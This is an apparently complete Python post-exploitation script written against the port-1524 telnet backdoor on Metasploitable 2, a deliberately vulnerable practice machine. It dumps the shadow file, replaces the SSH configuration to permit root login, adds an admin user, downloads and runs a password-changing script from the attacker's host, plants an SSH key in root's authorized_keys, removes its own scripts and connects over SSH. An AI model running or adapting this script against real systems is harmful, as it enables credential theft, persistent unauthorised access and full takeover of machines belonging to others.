import telnetlib,sys,os,subprocess,time
#
# Usage: python -m SimpleHTTPServer 80 & 
#        python pop1524.py [RHOST] [LHOST]
# 
# pop1524.py is a script that utilizes the telnet backdoor on port 1524 that is available on metasploitable 2 in order to perform post-exploit actions such as:
#
# 1. Download shadow file to [LHOST]
# 2. Replace SSH server configuration (Permit RootLogin and AuthorizedKeys)
# 3. Add [user] to admin group
# 4. Download changepass.sh from [LHOST] and execute to change all user passwords with shell /bin/bash
# 5. Download iptables.sh from [LHOST]
# 6. Add SSH key to /root/.ssh/authorized_keys
# 7. Execute iptables.sh and clean up scripts
# 7. Connect to [user] via SSH
  
if len(sys.argv) != 3:
    print "Usage: python pop1524.py RHOST LHOST"
    exit(1)

RHOST = str(sys.argv[1])
LHOST = str(sys.argv[2])

try:
    connect_telnet = telnetlib.Telnet(RHOST, 1524, 5)
except:
    print "Failed to connect"
    exit()

connect_telnet.read_until("#")

#Grab shadow file
connect_telnet.write("getent shadow\n")
empty = ""

time.sleep(1)
while True:
    temp = connect_telnet.read_eager()
    if (temp == ""):
        break
    empty += temp

with open("shadow", "w") as f:
    f.write(empty)
print "Finished getting shadow file from" , sys.argv[1]

#Modify and start ssh
try:
    print "Downloading vulnerable sshd_config"
    connect_telnet.write("wget http://" + LHOST + "/sshd_config && cp /etc/ssh/sshd_config /etc/ssh/shd_config.cp && cp sshd_config /etc/ssh/sshd_config && /etc/init.d/ssh restart\n")
    time.sleep(1)
    connect_telnet.read_eager()
except:
    print "Failed to modify SSH"
    exit()
print "Finished replacing sshd_config"

#Transfer further payloads, add privileged user (Change user passwords, Set up iptables)
try:
    print "Adding privileged user"
    connect_telnet.write("useradd missing -s /bin/bash && usermod -aG admin missing\n")
    time.sleep(1)
    connect_telnet.read_eager()
except:
    print "Failed to add privileged user"
    exit()
print "Finished adding privileged user"

try:
    print "Downloading changepass script"
    connect_telnet.write("wget http://" + LHOST + "/changepass.sh && sh changepass.sh\n")
    time.sleep(1)
    connect_telnet.read_eager()
except:
    print "Failed to run changepass script"
    exit()
print "Finished changing all user passwords"

try:
    print "Downloading iptables script"
    connect_telnet.write("wget http://" + LHOST + "/iptables.sh\n")
    time.sleep(1)
    connect_telnet.read_eager()
except:
    print "Failed to download iptables script"
    exit()
print "Finished downloading iptables script"

print "Exiting from telnet connection"
connect_telnet.write("exit\n")
connect_telnet.close()

#Set up ssh key and iptables
#Afterwards, clean up scripts
try:
    print "Attempting to install SSH key"
    os.system("cat ~/.ssh/id_rsa.pub | ssh root@" + RHOST + " 'cat >> /root/.ssh/authorized_keys && sh /iptables.sh && rm /iptables.sh /changepass.sh'")
except:
    print "Failed to add SSH key"
    exit()
print "SSH key installed"

try:
    print "Connecting via SSH"
    os.system("ssh missing@" + RHOST)
except:
    print "Failed to connect via SSH"
    exit()
print "Connected to SSH session"
